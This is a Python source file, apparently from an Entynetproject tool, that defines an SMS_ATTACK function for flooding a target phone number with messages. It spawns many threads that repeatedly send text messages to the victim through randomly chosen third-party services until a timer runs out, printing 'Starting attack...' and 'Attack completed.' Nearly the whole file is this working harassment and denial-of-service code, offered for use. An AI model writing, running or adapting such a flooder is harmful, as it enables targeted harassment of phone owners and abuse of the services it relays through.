#!/usr/bin/env python3

# MIT License
#
# Copyright (C) 2020, Entynetproject. All Rights Reserved.
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import time
from threading import Thread
# Import modules for SMS & CALL flood
import sendRequest as request
import numberTools as number
import randomData  as randomData
import toolbar

def SMS_ATTACK(threads, attack_time, phone):
	# Finish
	global FINISH
	FINISH = False
	threads_list = []

	services = request.getServices()
	phone = number.normalize(phone)
	country = number.getCountry(phone)
	print("Starting attack...")

	def sms_flood():
		sum = 0
		while not FINISH:
			sum += 10
			toolbar.update_progress(sum/100.0)
			service = randomData.random_service(services)
			service = request.Service(service)
			service.sendMessage(phone)
		toolbar.update_progress(100/100.0)

	print("Starting threads...")
	for thread in range(threads):
		t = Thread(target = sms_flood)
		t.start()
		threads_list.append(t)
	try:
		time.sleep(attack_time)
	except KeyboardInterrupt:
		FINISH = True
	for thread in threads_list:
		FINISH = True
		thread.join()
	
	print("Attack completed.")
